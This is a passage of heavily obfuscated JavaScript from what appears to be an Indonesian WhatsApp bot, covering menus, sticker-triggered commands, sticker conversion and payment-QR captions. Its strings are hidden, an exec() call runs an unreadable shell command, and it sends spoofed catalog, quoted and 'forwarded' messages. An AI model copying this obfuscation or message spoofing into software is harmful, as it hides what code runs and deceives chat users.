_0x260a84={};_0x260a84[_0x39f25f(0x74a,0x647,0x9af,0xa39)]=_0x1f7707(0x537,0x28b,0x62b,0x845)+'ff',_0x260a84['buttonText']=_0x2f2970,_0x260a84[_0x1f7707(0x11d,0x83d,0x520,0x49d)]=_0x1f7707(-0x29,0x1f2,0x357,0x6a5);let gaklopo=[_0x36a5e4,_0x260a84];if(isCmd&&!mek[_0x39f25f(0x23c,0x123,-0x30e,-0x16d)][_0x1f7707(-0xc,-0xe8,0x310,0xf2)]&&!isOwner&&!isCreator&&!isRegister)return sendButMessage(from,'Hi\x20@'+sender[_0x1f7707(0x596,0x11e,0x20e,-0x80)]('@')[-0x1339+-0x71*-0x18+0x8a1]+(_0x39f25f(0x5c4,0x4c4,0x674,0x3fa)+_0x1f7707(0x235,0x2ac,0x516,0x23d)+_0x1f7707(0x539,0x65c,0x1da,-0x175)+'\x20database.'+'\x20Silahkan\x20'+_0x1f7707(0x36,0x746,0x32f,0x250)+_0x1f7707(0x120,0x8da,0x59b,0x190)+_0x39f25f(0xd5,-0xbd,0x2be,-0x458)+_0x1f7707(-0x2ef,0x38b,0x186,0x35c)+'gan\x20cara\x20k'+'etik\x20@veri'+_0x39f25f(0x58f,0x29f,-0x1f5,0xbc)+_0x39f25f(0x663,0x684,0x35a,0x5d3)+_0x39f25f(-0x1f9,-0xec,0x2af,-0x1a4)),botname+_0x39f25f(-0x2fe,0x6d,0x3f9,0x4dc)+ownername,gaklopo,{'quoted':fgclink2,'contextInfo':{'mentionedJid':[sender]}});}function _0x39f25f(_0x45f9e8,_0x2339f6,_0x5d9471,_0x56b0e4){return _0x3a08(_0x2339f6- -0x21a,_0x45f9e8);}const sendKatalog=async(_0x301c6f,_0x3a13cd,_0x144874)=>{const _0x3b0581={'XbcEM':_0x127924(0x660,0x64d,0x970,0x4f5)+_0x127924(-0x43,-0x49c,-0x449,0xab)+'/p_2068ity'+_0x127924(-0x145,0x235,-0x1b8,-0x30b),'mvQcU':_0x34b724(-0x35,0x303,0x24b,-0x156)+_0x127924(-0x43,0x3bc,-0x24f,0xc9)+'/p_2068gt4'+'wc1.jpg','OvjwR':'https://e.'+_0x127924(-0x43,0x18a,0x23e,0x37f)+_0x34b724(0x7b5,0x370,0x8d8,0x798)+_0x127924(0x270,-0x1ca,0x4f8,-0x22e),'tdNyV':_0x34b724(0x390,0x6fe,0x4d8,0x51d)+_0x127924(-0x43,-0x29c,-0x56,-0x2e6)+_0x127924(-0x88,-0x82,0x18a,-0x6)+_0x34b724(0x7b7,0x156,0x766,0x2fc),'TFGYc':function(_0x10b792,_0x426fff){return _0x10b792*_0x426fff;},'lIXWU':function(_0x3fc9bb,_0x509233){return _0x3fc9bb(_0x509233);},'cLxMh':'0@s.whatsa'+_0x34b724(0x29c,0x7dc,0xb58,0x6b8),'XLMfR':'3595319159'+_0x127924(-0xa5,-0x113,0x29b,-0x458),'DPAVU':_0x34b724(-0xd7,-0x153,-0x1a3,0x1fa),'hbcck':_0x127924(-0x2d,0x1b0,-0x303,-0x282)+_0x34b724(-0x2c,-0x16b,0x396,0x2ed)+_0x34b724(-0x1df,-0x5cf,-0x4e0,-0x18b)};let _0xbf6e86=[_0x3b0581[_0x127924(-0x151,-0x485,0x50,0xc5)],_0x127924(0x610,0x791,0x75b,0x7ab)+_0x127924(-0x43,-0x4e3,0x1a6,-0x182)+_0x127924(0x359,-0x6e,0x2fe,0x41c)+_0x34b724(0x2c2,-0xf2,-0x183,0x17),_0x3b0581[_0x127924(-0x10,-0xe5,0x445,-0x205)],_0x3b0581[_0x127924(0x35d,0x7bd,0x2d7,0x328)],_0x3b0581[_0x34b724(-0xe3,0xcf,0x3bb,0x37e)]];var _0x121f06=_0xbf6e86[Math[_0x127924(0x16e,0x353,0x44d,0x80)](_0x3b0581['TFGYc'](Math[_0x34b724(0xbc,0x446,0x3a3,0xb5)](),_0xbf6e86[_0x127924(0x62d,0x93a,0xa7f,0x521)]))];let _0x277a9e=await _0x3b0581[_0x34b724(0x570,0x289,0x2fe,0x1a8)](getBuffer,_0x121f06);imeu=await alpha[_0x127924(0x8e,0x51b,0x258,0x10d)+'sage'](_0x3b0581[_0x34b724(0x419,0x940,0x351,0x6bb)],_0x277a9e,image,{'thumbnail':_0x277a9e}),imeg=imeu['message']['imageMessa'+'ge'];const _0x1999b3={};_0x1999b3[_0x34b724(0x1f7,0x479,0x6c5,0x3d5)+'ge']=imeg,_0x1999b3['productId']=_0x3b0581[_0x34b724(0x92e,0x934,0xaa0,0x6fc)],_0x1999b3[_0x127924(-0x165,0x2b8,-0x5fb,-0x176)]=_0x301c6f,_0x1999b3[_0x127924(0xf7,-0x1d2,-0x3a5,-0x37b)+'n']=_0x144874,_0x1999b3[_0x127924(0x6,-0x217,-0x111,0x19b)+'de']='USD',_0x1999b3[_0x34b724(0x71d,0x868,0x2ba,0x738)+_0x127924(0x3fd,0x259,0x19,0x265)]=_0x3a13cd;function _0x127924(_0x34dfce,_0x38d374,_0x20c003,_0x221ce4){return _0x1f7707(_0x34dfce-0x16d,_0x221ce4,_0x34dfce-0x161,_0x221ce4-0x51);}_0x1999b3[_0x34b724(-0x4c,-0x1cf,0x1a2,0xe6)+_0x127924(0x1af,0x2a4,0x13a,-0x290)]=_0x3b0581[_0x127924(0x524,0x483,0x20e,0x666)],_0x1999b3[_0x34b724(0x807,0x4d2,0x576,0x3d5)+_0x127924(0x83,-0x3a0,0x1db,0x4d3)]=0x1;const _0x12e73b={};_0x12e73b[_0x34b724(0x69e,0x70c,0x912,0x624)+_0x34b724(0xba,0x2a0,0x48e,0x118)]=0x3,_0x12e73b[_0x127924(0x10,-0x45,-0x17f,0x1f0)+'d']=!![];const _0x356154={};_0x356154[_0x34b724(-0x327,-0x219,0x1be,-0x38)]=_0x1999b3,_0x356154['businessOw'+_0x127924(0x6da,0x75c,0x9f4,0x27c)]=_0x3b0581[_0x127924(-0xcc,-0x30b,-0x18e,-0x364)],_0x356154['contextInf'+'o']=_0x12e73b;const _0x28a2c3={};_0x28a2c3[_0x127924(0x50c,0x66b,0x335,0x718)+_0x34b724(-0x415,-0x3e5,0x274,-0x123)]=_0x356154;const _0x432592={};_0x432592[_0x127924(0xb9,-0x314,0x532,0x489)]=ftoko,_0x432592[_0x34b724(0x70e,0x87e,0x66c,0x647)+'o']={};function _0x34b724(_0x56861f,_0x1c3580,_0x2fa66b,_0x26c313){return _0x1f7707(_0x56861f-0x1d2,_0x1c3580,_0x26c313-0x118,_0x26c313-0x1b);}res=await alpha[_0x34b724(-0xd8,-0x188,0xca,0x45)+_0x34b724(0x8ca,0x9b7,0x69e,0x662)+_0x127924(0x763,0xb69,0x3f3,0x44b)](from,_0x28a2c3,_0x432592),alpha['relayWAMes'+_0x34b724(-0xbf,-0x55b,0x36f,-0x123)](res);},sendImageMaker=async(_0x39b504,_0x4dd8a2,_0x2cbafb)=>{function _0x1838a2(_0x296434,_0x46484c,_0x5c83f6,_0x552693){return _0x39f25f(_0x296434,_0x5c83f6-0x20,_0x5c83f6-0x175,_0x552693-0x34);}const _0x1bae6f={'UuYwC':function(_0x4b26a6,_0x329c6c){return _0x4b26a6(_0x329c6c);},'NVjDD':'ephemeralM'+_0x5d7468(0x31e,0x3a,0xc3,0x73a),'qrvJG':_0x1838a2(0x8c5,0x9fa,0x6eb,0x803),'vpFef':_0x1838a2(0x5ba,0x836,0x44e,0x659),'PMSmv':_0x5d7468(0x23f,0xaf,0x4b1,0xbd)},_0x45eb18=await alpha['prepareMes'+'sage'](from,_0x39b504,MessageType[_0x1838a2(-0x19b,0x3c3,0x71,-0x34a)],{'thumbnail':Buffer[_0x5d7468(0x1ca,-0x20b,0x1cc,-0x2f4)](0x65a*-0x3+0x8*-0x1ba+0x20de)});let _0x18f397=_0x45eb18[_0x1838a2(0x1fc,0x30f,-0xbc,0x1eb)][_0x1bae6f['NVjDD']]?_0x45eb18[_0x1838a2(0x175,-0xad,-0xbc,0x183)]['ephemeralM'+_0x5d7468(0x31e,0x37a,0x1b2,-0x120)]:_0x45eb18;const _0x1808b0={};_0x1808b0['displayTex'+'t']=_0x1838a2(0xb4,-0x363,-0x5b,0x31c);const _0x7e4116={};_0x7e4116['buttonId']=_0x1bae6f[_0x1838a2(-0x363,0x3cb,0xa3,0x55a)],_0x7e4116['buttonText']=_0x1808b0,_0x7e4116[_0x1838a2(0x509,0x575,0x6ee,0x83e)]=0x1;const _0x3f97a8={};_0x3f97a8[_0x5d7468(0x71d,0x874,0xa5f,0x81c)]=_0x1bae6f[_0x1838a2(0x6c1,0x747,0x370,0x1e7)],_0x3f97a8[_0x5d7468(0x452,0x210,0x3a8,0x741)]={},_0x3f97a8[_0x5d7468(0x7a4,0x5c3,0x404,0x944)]=0x1,_0x3f97a8[_0x5d7468(0x452,0x210,0x3a8,0x741)]['displayTex'+'t']=_0x1bae6f['PMSmv'];const _0xc1d63a=[_0x7e4116,_0x3f97a8],_0x545657={'contentText':_0x4dd8a2,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x5d7468(0x31d,-0xf8,0x551,0x3c0)+_0x1838a2(0x5ee,0x3aa,0x2c0,0x41a))+_0x2cbafb[_0x1838a2(0x4ff,0xcc,0x3dc,0x510)]('@')[0x14c6+-0x1*0x1a95+0x1*0x5cf],'buttons':_0xc1d63a,'headerType':0x4,'imageMessage':_0x18f397[_0x1838a2(0x3f2,0x219,-0xbc,-0x210)][_0x1838a2(0x39a,-0x410,-0x2d,0x2c3)+'ge']},_0x33c66d={};_0x33c66d['mentionedJ'+'id']=[_0x2cbafb];const _0x52db60={};_0x52db60[_0x1838a2(0x10d,0x260,0x126,0x2cf)]=mek;function _0x5d7468(_0x1a980e,_0x5b5608,_0x217f94,_0x531684){return _0x39f25f(_0x531684,_0x1a980e-0xd6,_0x217f94-0xdd,_0x531684-0x155);}_0x52db60[_0x1838a2(0x5c2,0xbb5,0x6fd,0x928)+'o']=_0x33c66d,alpha['sendMessag'+'e'](from,_0x545657,MessageType['buttonsMes'+'sage'],_0x52db60)[_0x5d7468(0x7cf,0x4e9,0x9ba,0x883)](_0x1f04cf=>{function _0xacc880(_0x490778,_0x3e6904,_0x2ffd82,_0x35fcd3){return _0x5d7468(_0x35fcd3- -0x86,_0x3e6904-0x1a3,_0x2ffd82-0x104,_0x3e6904);}function _0xb61040(_0x281b6a,_0x242f9b,_0x456e7f,_0x43ffee){return _0x5d7468(_0x456e7f- -0x178,_0x242f9b-0xf8,_0x456e7f-0x1e2,_0x281b6a);}_0x1bae6f['UuYwC'](reply,'Terjadi\x20ke'+_0xacc880(0xf2,0xf4,0x8a,0x1b8)+_0xacc880(0xb7,0x67e,0x4b7,0x2e6)+_0xacc880(0x1c4,0x76e,0x6df,0x344)+'gi');});},send_qr_gopay=async(_0x9b2207,_0x275595)=>{ini_bayar=ucapannya2+('\x0a\x0a\x0a•>\x20Nama'+'\x20:\x20_')+pushname+(_0x229720(0x657,0x434,0x4ef,0xdc)+_0x507cdb(0x51e,0x7a,0x677,0x232))+sender[_0x229720(0xca8,0x87b,0xd07,0x612)]('@')[-0xa*-0x369+0x312*-0x6+-0xfae]+(_0x229720(0xd40,0x956,0x674,0x6af)+'\x20:\x0a1.\x20Buka'+_0x229720(0xba3,0x90b,0x661,0xbd1)+_0x229720(0xb5f,0x8c6,0xca4,0x4dd)+_0x507cdb(0xa20,0x674,0x7a0,0xa74)+_0x507cdb(0xab0,0x722,0xa7d,0x8f8)+_0x507cdb(0x9e6,0x6cd,0x9bc,0x76c)+_0x229720(0xd1a,0x920,0xc52,0xb5c)+_0x507cdb(0x657,0x409,0xa40,0x7f0)+_0x507cdb(0x76b,0x6df,0x80e,0x4af)+_0x507cdb(0x984,0xbb5,0x965,0x723)+_0x507cdb(0x4b2,0x8cb,0x5ba,0x596)+'l\x20pembayar'+_0x229720(0xb4f,0xbe0,0x743,0xf56)+_0x507cdb(0x4d9,0x225,0x792,0x86c)+_0x507cdb(0x554,0x360,0xa0e,0x632))+ini_mark[_0x229720(0xc21,0x87b,0x731,0x44b)]('@')[0x708+-0x1a96+0x138e]+'_\x0a';function _0x229720(_0x2c79f4,_0x1c39a6,_0x164f85,_0x5bcefd){return _0x1f7707(_0x2c79f4-0x1b1,_0x2c79f4,_0x1c39a6-0x66d,_0x5bcefd-0x1d7);}const _0x30447d={};function _0x507cdb(_0x730770,_0x2b741e,_0x3866b0,_0xdf3a99){return _0x1f7707(_0x730770-0x98,_0x3866b0,_0x730770-0x509,_0xdf3a99-0x12c);}_0x30447d[_0x229720(0x9a3,0xafe,0x7cd,0x9f8)+'id']=[sender,ini_mark],await alpha[_0x507cdb(0x2d7,0x6b0,0x3f9,-0x199)+'e'](from,_0x9b2207,image,{'thumbnail':Buffer[_0x229720(0x5d5,0x5b3,0x294,0xa4c)](-0x734+0x576+-0x1*-0x1be),'quoted':_0x275595,'caption':ini_bayar,'contextInfo':_0x30447d});},send_qr_ovo=async(_0x2293dd,_0x261c27)=>{ini_bayar=ucapannya2+('\x0a\x0a\x0a•>\x20Nama'+_0x19a276(0x78a,0x5ce,0x61b,0x3d6))+pushname+(_0x535c99(0x15e,0x154,0x2d6,0x37f)+_0x19a276(0x4e1,0x4cd,0x3ac,0x3d4))+sender[_0x535c99(0x5a5,0x811,0x501,0x1b6)]('@')[0x3bf*0x1+-0xa36*-0x2+-0x182b]+('_\x0a\x0a\x0aCarany'+'a\x20:\x0a1.\x20Buk'+'a\x20Aplikasi'+_0x19a276(0x254,0x1fd,0x193,0x268)+'P-mu.\x0a2.\x20P'+_0x19a276(0x6e6,0xb35,0x748,0x8b5)+'\x20Bayar\x0a3.\x20'+_0x535c99(0x8a7,0x68e,0x5e1,0x886)+_0x535c99(0x1f0,-0x1e2,0x424,0x464)+_0x535c99(0xe1,0x333,-0x361,-0x1c8)+'n\x20Masukkan'+_0x535c99(0x31c,0x1eb,0x424,0x65e)+_0x19a276(0x29c,0x23f,-0x22a,-0x258)+_0x19a276(0x76a,0xaf1,0xf6b,0xf65)+_0x19a276(0x12c,0x31b,0x4f1,0x6cf)+'@')+ini_mark[_0x19a276(0x52c,0x6c6,0x3b3,0x6b7)]('@')[-0x1761+-0xed0+0x3*0xcbb]+'_\x0a';function _0x19a276(_0x1b366c,_0x17528a,_0x7a8a70,_0x5f3944){return _0x39f25f(_0x7a8a70,_0x17528a-0x30a,_0x7a8a70-0x26,_0x5f3944-0x4e);}const _0x3fd165={};_0x3fd165[_0x19a276(0x914,0x949,0x917,0xd0f)+'id']=[sender,ini_mark];function _0x535c99(_0x54ea00,_0x5c0e41,_0x4858ac,_0x16684e){return _0x39f25f(_0x16684e,_0x54ea00-0x1e9,_0x4858ac-0x51,_0x16684e-0x1d);}await alpha[_0x535c99(0x165,0x4e1,0x258,-0xde)+'e'](from,_0x2293dd,image,{'thumbnail':Buffer[_0x535c99(0x2dd,0x2af,0x321,0x221)](0x1bda+0x200+-0x1dda),'quoted':_0x261c27,'caption':ini_bayar,'contextInfo':_0x3fd165});},send_qr_dana=async(_0x402ac9,_0x31a61f)=>{ini_bayar=ucapannya2+(_0x56f82f(0x5a4,0x585,0x910,0xa0c)+_0x56f82f(-0x267,0xf7,-0x2a2,-0x288))+pushname+(_0x56f82f(-0x10,-0x258,-0x99,-0x19e)+_0x1018bd(0x993,0x769,0x630,0xb7a))+sender['split']('@')[-0x1399+0x1785+-0x3ec]+(_0x56f82f(0x33a,0x2ca,-0x155,0x74)+_0x56f82f(0x23a,0x3fb,0x146,0x52d)+_0x56f82f(0x685,0x27f,0x63c,-0x152)+_0x56f82f(0x21b,0x2d0,0x732,0x44f)+_0x56f82f(0x7bd,0x519,0x626,0x58d)+_0x56f82f(0x4a1,0x65e,0x476,0x20e)+_0x1018bd(0x7bc,0x6af,0x3c5,0x416)+_0x56f82f(0x40d,0x4f1,0x476,0x816)+_0x1018bd(0x1ce,0x5ad,0x261,0x699)+_0x1018bd(0x64d,0xa42,0xc3b,0xb8e)+_0x56f82f(-0x90,-0x2b8,-0x4c6,-0x49c)+_0x1018bd(0x207,0x542,0x9e6,0x4ec)+_0x56f82f(0x174,-0x29e,-0x724,-0xae)+_0x56f82f(0xadf,0x680,0x75e,0xaed)+_0x56f82f(0x2b,0xe5,-0x4,0x443)+'\x20@')+ini_mark[_0x1018bd(0x898,0x962,0xb28,0x983)]('@')[0x1c1*-0xa+0x11b*-0x2+0x13c0]+'_\x0a';function _0x1018bd(_0x23cbaa,_0x4700eb,_0x188b26,_0x4f57d8){return _0x39f25f(_0x23cbaa,_0x4700eb-0x5a6,_0x188b26-0x13c,_0x4f57d8-0x1c1);}const _0x1af16e={};_0x1af16e['mentionedJ'+'id']=[sender,ini_mark];function _0x56f82f(_0x4f466f,_0xd07777,_0x3310c9,_0x32a1a5){return _0x1f7707(_0x4f466f-0x19d,_0x3310c9,_0xd07777- -0x1f,_0x32a1a5-0xb3);}await alpha[_0x56f82f(-0x4c9,-0x251,-0x127,0x16b)+'e'](from,_0x402ac9,image,{'thumbnail':Buffer[_0x56f82f(0x32a,-0xd9,-0x1f1,-0x43f)](-0x692+0x1e5*-0x10+0x24e2),'quoted':_0x31a61f,'caption':ini_bayar,'contextInfo':_0x1af16e});},{quotesmenu,shopmenu,animemenu,coganmenu,helpmenu,convertmenu,funmenu,downloadmenu,makermenu,telestiker,othermenu,ownermenu,set_stc_cmd,storagemenu,cecanmenu,tagmenu,upmenu,nsfwmenu,asupanmenu,image_effect,allmenu}=require(_0x1f7707(0x4f7,-0x86,0x1c6,0x30f)+_0x39f25f(0x2d3,0x643,0x3e9,0x72b)),isBtMsg=type==_0x39f25f(0x8e1,0x7a5,0x5b0,0xbfc)+_0x39f25f(0x60c,0x470,0x5d6,0x32c)+'ge'?mek[_0x1f7707(-0x4c,-0x4e3,-0x28a,-0xfc)][_0x39f25f(0xc2c,0x7a5,0x45e,0x4fc)+_0x39f25f(0x419,0x470,-0x44,0x59b)+'ge'][_0x1f7707(0x4b,0x557,0xc4,0x415)+'splayText']:'',isStMsg=type==_0x1f7707(0x31f,0x300,0x1d3,0x668)+_0x39f25f(-0x17f,0x10,0x4a7,0x372)?mek['message'][_0x39f25f(0x711,0x381,0x652,0x4e1)+_0x1f7707(0x1bd,-0x243,-0x19e,0x17c)][_0x1f7707(-0x194,-0x69e,-0x2c6,0xaa)]:'',stc=mek['message'][_0x1f7707(-0x37d,0x44d,0xa3,0xd8)+'sage'],msc=mek[_0x1f7707(-0x38f,-0x148,-0x28a,0x1df)][_0x39f25f(0x7da,0x5ab,0xa26,0x708)+'ge'];wew=fs['readFileSy'+'nc'](_0x1f7707(-0x354,0xba,-0xbf,0x329)+thumbnail),alfa2=_0x39f25f(-0x3cc,0x1,0x49f,0x479)+_0x1f7707(0x4cd,-0x2e,0x220,0x572)+'sapp.net',alfa3=_0x39f25f(0x61,0x409,0x738,0x6a)+_0x39f25f(0x499,0x3db,0x3ae,0x608)+_0x39f25f(-0x144,0x3f,-0x13d,-0x7c);if(msc){if(msc['fileLength']==-0x263*0x5b+-0x3a2b*0x6+0x315af*0x1){const _0x5343e3={};_0x5343e3[_0x39f25f(0x7f1,0x63f,0x88b,0x667)+'id']=[alfa],_0x5343e3[_0x39f25f(0xa09,0x6ba,0xa40,0xaf7)+_0x1f7707(0x3de,0x371,0x0,0x192)]=0x3e7,_0x5343e3['isForwarde'+'d']=!![],alpha[_0x39f25f(0x41f,-0x84,0x122,0x420)+'e'](from,wew,image,{'thumbnail':fs[_0x39f25f(0x743,0x2b4,-0x89,0x4b5)+'nc'](_0x1f7707(-0x2bf,0x194,-0xbf,-0x1b6)+thumbnail),'quoted':ftroli,'caption':help(prefix,hahh,pushname,ownername,status),'contextInfo':_0x5343e3,'sendEphemeral':!![]});}}if(stc){if(stc[_0x39f25f(0x493,0x4bc,0x93,0x217)]==''+cmd_stc_ping){console[_0x39f25f(0x563,0x59f,0x8b8,0x61c)](color(time,'magenta'),color(moment['tz'](_0x1f7707(0x69c,0x615,0x56c,0x916)+'ta')[_0x39f25f(0x48,0x2e1,-0xc8,0x348)](_0x39f25f(0x224,0x339,0x6f1,0x5e6)),'gold'),color(_0x39f25f(0x1e5,0x11d,-0x8d,0x1b5)+'eed'));const timestamp=speed(),latensi=speed()-timestamp;exec(_0x39f25f(0x8d,0x20b,0x255,-0xc6)+_0x39f25f(0x166,-0x52,-0x274,0x2a8),(_0x2e0337,_0x30d37e,_0x6a0436)=>{const _0x55a601={'IwKzm':'Ram:','GagCo':function(_0x316861,_0x2c3a86){return _0x316861(_0x2c3a86);}},_0x4e9c88=_0x30d37e[_0x180e89(0x974,0xddb,0xed5,0xe6c)](_0x5dfb84(-0x37e,0x10b,-0x10b,-0x234)),_0x599c39=_0x4e9c88[_0x180e89(0x754,0x9e2,0x948,0x6d7)](/Memory:/,_0x55a601[_0x5dfb84(0x586,0x1ab,0x37f,0x2d2)]);function _0x5dfb84(_0x47e2ec,_0x1d7c4e,_0x2a3ce0,_0x3cd3c0){return _0x1f7707(_0x47e2ec-0x10a,_0x3cd3c0,_0x1d7c4e-0x34,_0x3cd3c0-0xaf);}function _0x180e89(_0x3b4fa3,_0x152a6d,_0x4c3a9d,_0x36bde5){return _0x1f7707(_0x3b4fa3-0x115,_0x4c3a9d,_0x152a6d-0x7a0,_0x36bde5-0x19f);}const _0x5596dc='*'+_0x599c39+_0x5dfb84(-0x610,-0x23e,-0x63a,-0x675)+latensi['toFixed'](0x1*0x23b7+-0x11b3+0x180*-0xc)+_0x5dfb84(0x483,0x546,0x996,0x772);_0x55a601['GagCo'](fakegroup,_0x5596dc);});}}stc&&(stc[_0x39f25f(0x717,0x4bc,0x442,0x77)]==''+cmd_stc_menu&&(console[_0x39f25f(0x486,0x59f,0x1df,0x2d2)](color(time,_0x1f7707(0x3da,0x66c,0x533,0x92a)),color(moment['tz'](_0x1f7707(0x477,0x362,0x56c,0xe2)+'ta')[_0x39f25f(0x1a7,0x2e1,0x330,0x1b1)](_0x1f7707(-0xf2,-0x3,0x18b,0x32f)),_0x1f7707(0x2f5,0x12c,0x411,0x3ca)),color(_0x1f7707(0x4a4,0x535,0x433,0x334)+_0x1f7707(0x1e,0x29a,0x41,0x2a2))),ini_thumbb=fs[_0x39f25f(0x5ab,0x2b4,0x5d9,-0xf6)+'nc'](_0x1f7707(0x1f6,0x1f7,-0xbf,0x82)+thumbnail),alpha['sendMessag'+'e'](from,ini_thumbb,image,{'thumbnail':fs[_0x39f25f(0x203,0x2b4,0xa8,0x5e2)+'nc'](_0x1f7707(0x152,0x1b8,-0xbf,-0x15f)+thumbnail),'caption':allmenu(prefix,wita,wit,ucapannya2,timuu,status,wa_version,mcc,mnc,os_version,device_manufacturer,device_model,alfa,alfa1,thisDay,ini_tanggal,totalchat,hit_today,ini_gcchat),'contextInfo':{'text':allmenu(prefix,wita,wit,ucapannya2,timuu,status,wa_version,mcc,mnc,os_version,device_manufacturer,device_model,alfa,alfa1,thisDay,ini_tanggal,totalchat,hit_today,ini_gcchat),'forwardingScore':0x3b9aca00,'isForwarded':!![],'sendEphemeral':!![]},'quoted':ftoko})));if(stc){if(stc['fileLength']==''+cmd_stc_self){const aJNXrd=_0x39f25f(0x2a1,0x49,0x213,0x480)[_0x1f7707(0x502,0x617,0x20e,0x9c)]('|');let vPWcIQ=0x255c+-0x989+-0x1bd3;while(!![]){switch(aJNXrd[vPWcIQ++]){case'0':banChats=!![];continue;case'1':fakeitem('「\x20*SELF-MO'+_0x1f7707(0x721,0x557,0x37f,0x6f8));continue;case'2':if(!mek['key'][_0x1f7707(-0x71,0x30,0x310,0x2a1)]&&!isOwner&&!isCreator)return reply(lang[_0x39f25f(0x6ce,0x287,0x33f,0x1b7)]());continue;case'3':if(banChats===!![])return;continue;case'4':console[_0x39f25f(0x2cf,0x59f,0x471,0x774)](color(time,_0x39f25f(0x2f7,0x6e1,0x793,0x50e)),color(moment['tz']('Asia/Jakar'+'ta')[_0x1f7707(0x7e,0x35b,0x133,0x2f6)](_0x1f7707(-0x143,0x2f6,0x18b,0x1cf)),_0x39f25f(0x62d,0x5bf,0x6d3,0x5b9)),color(_0x39f25f(-0x308,-0x90,-0x169,-0x38)+'E'));continue;}break;}}}if(stc){if(stc['fileLength']==''+cmd_stc_public){console[_0x1f7707(0x4ef,-0x8,0x3f1,0x56b)](color(time,'magenta'),color(moment['tz'](_0x1f7707(0x94e,0x9f2,0x56c,0x943)+'ta')[_0x1f7707(0x16c,0x54d,0x133,0x5bf)](_0x39f25f(0x4dc,0x339,0x5e2,0xd6)),'gold'),color(_0x39f25f(0x757,0x774,0x984,0x322)+_0x39f25f(0x28e,0x449,0xdd,-0x2b)));if(!mek[_0x39f25f(0x214,0x123,-0x205,0x28f)][_0x1f7707(0x73d,0x73d,0x310,0x1c4)]&&!isOwner&&!isCreator)return reply(lang[_0x39f25f(-0x18d,0x287,0x6e0,0xfa)]());if(banChats===![])return;banChats=![],fakeitem('「\x20*PUBLIC-'+_0x39f25f(-0x2ee,0x2e,0x4a6,0x339));}}if(stc){if(stc[_0x39f25f(0x6f0,0x4bc,0x8b5,0x622)]==''+cmd_stc_image_to_sticker){console['log'](color(time,_0x1f7707(0x8c3,0x501,0x533,0x9a7)),color(moment['tz'](_0x1f7707(0x948,0x3d5,0x56c,0x7b2)+'ta')[_0x39f25f(0x6a,0x2e1,0x198,0x4ee)]('HH:mm:ss'),_0x39f25f(0x993,0x5bf,0x175,0x51a)),color(_0x39f25f(0x9b,0x78,0x428,0x2ef)+_0x1f7707(0x16c,0x585,0x36f,0x128)+_0x1f7707(0x43,-0x608,-0x242,0x1b4)));const isPoto=type==='imageMessa'+'ge'||type==='videoMessa'+'ge',isVideo=type===_0x39f25f(0x4f9,0x251,-0x46,-0xf1)+_0x1f7707(0x162,-0x449,-0x23b,-0x254)&&content['includes'](_0x39f25f(0x1ff,0x185,0x635,0x5c)+'ge'),isFoto=type===_0x39f25f(-0xbb,0x251,0x167,0x69b)+'sage'&&content[_0x1f7707(0x283,0x845,0x39f,-0xd0)](_0x39f25f(0x1b7,-0x4d,-0x47c,0x269)+'ge');if((isPoto&&!mek[_0x1f7707(-0x35d,0x15e,-0x28a,0x1d4)][_0x39f25f(0x617,0x185,0x5f3,-0x289)+'ge']||isFoto)&&args['length']==0x75c+-0x254e+0x1df2){const encmedia=isFoto?JSON[_0x39f25f(0x621,0x5e0,0x5e8,0x492)](JSON[_0x1f7707(0x3a6,0x4a5,0x21a,0x2e9)](mek)[_0x39f25f(0x4e2,0x3f0,0x19a,0x4c7)]('quotedM','m'))[_0x39f25f(-0x575,-0xdc,-0x2e8,-0x465)]['stickerMes'+'sage'][_0x1f7707(0x49c,0x651,0x52f,0x289)+'o']:mek,media=await alpha['downloadAn'+_0x39f25f(0x576,0x242,-0x6c,-0x25)+'Message'](encmedia);ran=_0x39f25f(0x40d,0x780,0xb7a,0x43e),await ffmpeg('./'+media)['input'](media)['on']('start',function(_0x13b654){function _0x54dc91(_0x51894d,_0x241cf,_0x4993fa,_0x3cb56e){return _0x1f7707(_0x51894d-0x30,_0x3cb56e,_0x51894d-0x3f6,_0x3cb56e-0x3c);}function _0x26be14(_0x405ddf,_0x393346,_0x1a878a,_0x4c3d08){return _0x1f7707(_0x405ddf-0x41,_0x405ddf,_0x4c3d08-0x792,_0x4c3d08-0x54);}console[_0x26be14(0x90b,0x890,0xc51,0xb83)](_0x54dc91(0x63e,0x452,0x56a,0x57f)+_0x13b654);})['on'](_0x1f7707(-0xcc,-0x3fc,-0x1b4,-0x5de),function(_0x2f93b4){const _0x52b398={'DUfLy':function(_0x3fff32,_0x1929a3){return _0x3fff32(_0x1929a3);},'xeARF':_0x4ac9f4(-0xbd,0xce,0x1e6,-0x313)};function _0x21b458(_0x35ef27,_0xca4a26,_0x2523a3,_0x155b0e){return _0x39f25f(_0xca4a26,_0x35ef27-0x409,_0x2523a3-0x74,_0x155b0e-0x174);}console['log']('Error\x20:\x20'+_0x2f93b4);function _0x4ac9f4(_0x213997,_0x577cbe,_0x35ae3c,_0x303ae0){return _0x39f25f(_0x35ae3c,_0x577cbe-0xd4,_0x35ae3c-0x25,_0x303ae0-0x89);}fs[_0x4ac9f4(0x587,0x909,0xb50,0xd58)](media),_0x52b398[_0x4ac9f4(0x2cc,0x15e,0x1ec,0x325)](reply,_0x52b398[_0x4ac9f4(0xcff,0x8de,0xd76,0x740)]);})['on']('end',function(){console[_0x283705(0x38c,0x78c,0xc54,0x79a)](_0x5e4fbd(0xa7c,0xd75,0xc05,0xaa1));const _0x329497={};function _0x5e4fbd(_0x131d84,_0x5c31f4,_0x2a6751,_0x17d94a){return _0x1f7707(_0x131d84-0x26,_0x131d84,_0x17d94a-0x4bc,_0x17d94a-0x10c);}_0x329497[_0x5e4fbd(0x22d,-0x24,0x2c8,0x414)]=mek,alpha[_0x5e4fbd(0x265,0x6a3,-0xd2,0x28a)+'e'](from,fs[_0x283705(0x239,0x7c9,0x6f8,0x4af)+'nc'](ran),sticker,_0x329497),fs[_0x283705(0xac4,0xa01,0x75f,0xa30)](media);function _0x283705(_0x275537,_0x4f5501,_0x5a4b81,_0x36bec4){return 